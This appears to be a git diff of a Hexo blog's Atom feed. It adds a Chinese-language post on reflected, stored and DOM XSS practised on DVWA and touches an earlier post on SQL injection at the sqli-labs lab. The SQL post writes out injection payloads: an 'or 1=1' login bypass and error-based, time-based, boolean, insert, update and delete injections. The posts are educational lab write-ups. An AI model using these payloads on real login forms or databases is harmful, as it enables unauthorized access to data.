@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://adad456.github.io/"/>
-  <updated>2019-10-20T04:41:17.903Z</updated>
+  <updated>2019-11-15T08:11:59.301Z</updated>
   <id>https://adad456.github.io/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>XSS学习</title>
+    <link href="https://adad456.github.io/2019/11/15/XSS%E5%AD%A6%E4%B9%A0/"/>
+    <id>https://adad456.github.io/2019/11/15/XSS学习/</id>
+    <published>2019-11-15T08:09:34.000Z</published>
+    <updated>2019-11-15T08:11:59.301Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>XSS：</strong></p><pre><code>跨站脚本（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。</code></pre><h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>参数型XSS，常见的就是在URL中构造，攻击的切入点是URL后面的参数，将恶意链接发送给目标用户。当用户访问该链接时候，会向服务器发起一个GET请求来提交带有恶意代码的链接，造成反弹型XSS。主要是GET类型 。</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573798306.52.png" alt=""></p><pre><code>通过burpsuite抓包，查看到返回包里面存在xss!!!</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573802823.66.png" alt=""></p><pre><code>再次打开正常页面没有xss弹框</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573798479.05.png" alt=""></p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p> 常见的就是在博客留言板、反馈投诉、论坛评论、将恶意代码和正文都存入服务器的数据库。每次访问都会触发恶意代码。 </p><p>在留言处提交XSS语句，成功弹框。</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573800625.27.png" alt=""></p><pre><code>通过burpsuite抓包,在返回包里发现xss!!!</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573803120.7.png" alt=""></p><pre><code>回到正常页面刷新页面，发现还是有弹框</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573803439.67.png" alt=""></p><h2 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM-XSS"></a>DOM-XSS</h2><p> DOM—based XSS漏洞是基于文档对象模型Document Object Model,DOM)的一种漏洞。DOM就是一个树状的模型，你可以编写Javascript代码根据dom一层一层的节点，去遍历/获取/修改对应的节点、对象、值。</p><pre><code>DOM-XSS特点：    DOM-XSS意味着一个xss漏洞出现在DOM中而不是网页的一部分。在反射型和存储型xss中，可以在服务器的返回网页中看到xss payload,但是在DOM-XSS中，HTML源码和攻击后返回的网页完全相同，只有在动态运行或调查网页的DOM树时才能看到xss payload。    DOM-XSS取决于输出位置，并不取决于输出环境，因此DOM-XSS既有可能是反射型，也有可能是存储型。</code></pre><p>  <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573801009.32.png" alt=""></p><pre><code>在dvwa靶场的DOM-xss上构造xss语句，成功弹框。</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573801402.43.png" alt=""></p><pre><code>通过burpsuite抓包，在返回包里面没有发现xss!!!</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573802431.21.png" alt=""></p><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><pre><code>1、DOM-XSS是由于浏览器解析机制导致的漏洞，服务器不参与，而存储型与反射型都需要服务器响应参与。2、最直观的区别（burpsuite抓包）：    存储型XSS：你发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码；    反射型XSS：你发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码；    DOM-XSS：你发送一次带XSS代码的请求，在返回包里找不到XSS代码；</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;strong&gt;XSS：&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;跨站脚本（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java
+      
+    
+    </summary>
+    
+    
+      <category term="web安全 - XSS" scheme="https://adad456.github.io/categories/web%E5%AE%89%E5%85%A8-XSS/"/>
+    
+    
+      <category term="XSS攻击" scheme="https://adad456.github.io/tags/XSS%E6%94%BB%E5%87%BB/"/>
+    
+  </entry>
   
   <entry>
     <title>基于报错注入</title>
@@ -83,7 +110,7 @@ Connection:
     <link href="https://adad456.github.io/2019/10/19/POST%E6%B3%A8%E5%85%A5/"/>
     <id>https://adad456.github.io/2019/10/19/POST注入/</id>
     <published>2019-10-19T03:25:46.000Z</published>
-    <updated>2019-10-19T03:29:22.296Z</updated>
+    <updated>2019-11-15T08:12:28.622Z</updated>
     
     <content type="html"><![CDATA[<p><strong>在登陆处用于判断账号、密码，在数据库中使用select语句；在修改密码处，更新密码会使用update语句；在购物系统中，订单的添加、删除会使用insert、delete语句</strong></p><p><em>数据库中创建一个test的表</em></p><pre><code>create table TEST(id int(3),username varchar(25),password varchar(25),primary key(id))</code></pre><h2 id="账号登陆"><a href="#账号登陆" class="headerlink" title="账号登陆"></a>账号登陆</h2><p><em>通过SQL的‘or’运算符构造万能密码,以sqlilabs靶场的第11关为例</em></p><pre><code>账号：admin&#39; or &#39;1&#39;=&#39;1密码：随意</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571451380.67.png" alt=""></p><p><em>在判断出注入点后，可以利用时间注入、布尔注入、报错注入接着获取更多的信息</em></p><p><em>报错注入：</em></p><pre><code>uname=admin&#39; or updatexml(1,concat(0x23,database(),0x23),1)#&amp;&amp;passwd=3421412sds</code></pre><p><em>时间注入：</em></p><pre><code>uname=admin&#39; and if(ascii(substr(database(),1,1))=115,sleep(5),1)#passwd=2142dwq</code></pre><p><em>布尔注入：</em></p><pre><code>uname=admin&#39; and ascii(substr(database(),1,1)) =115#&amp;&amp;passwd=41234</code></pre><h2 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h2><p><em>SQL语句：</em></p><pre><code>insert into test(id,username,password) values(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);</code></pre><pre><code>insert into test values(&#39;4&#39;,&#39;version()&#39;,&#39;c&#39;);-- &#39;&#39;,&#39;b&#39;,&#39;c&#39;);</code></pre><pre><code>insert into test values(&#39;4&#39;,USER(),&#39;c&#39;);-- &#39;&#39;,&#39;b&#39;,&#39;c&#39;);</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571453303.2.png" alt=""></p><p><em>此处的USER()就是构造的payload，单引号闭合会使得payload变成字符串，可以接着获取更多数据库信息</em></p><p><em>实际中无法知道数据库中表的列数，可以先尝试用数字代替字符串的列（字符串无法代替数字），错误时会插入失败</em></p><pre><code>insert into test values(&#39;1&#39;,2,3,4,5,6,7);-- &#39;&#39;,&#39;b&#39;,&#39;c&#39;);</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571453937.25.png" alt=""></p><pre><code>insert into test values(&#39;1&#39;,2,3);-- &#39;&#39;,&#39;b&#39;,&#39;c&#39;);</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571454023.71.png" alt=""></p><h2 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h2><p><em>SQL语句：</em></p><pre><code>update test set name=&#39;shiqi&#39; where id=1;</code></pre><pre><code>update test set username=&#39;adwdas&#39;,password=&#39;user()&#39; where id=2-- &#39; where id=2;</code></pre><pre><code>update test set username=&#39;adwdas&#39;,password=user() where id=1-- &#39; where id=1;</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571454596.92.png" alt=""></p><p><em>与insert类似，除了闭合位置不同，其他的完全一样；此时password处的user()就是构造的攻击语句</em></p><h2 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h2><p><em>SQL语句：</em></p><pre><code>delete from test where id=2;</code></pre><pre><code>delete from test where id=2 and if(1=1,sleep(5),0);</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571455212.6.png" alt=""></p><p><em>判断出注入点就可以构造其他的攻击语句，获取更多信息</em></p>]]></content>
     
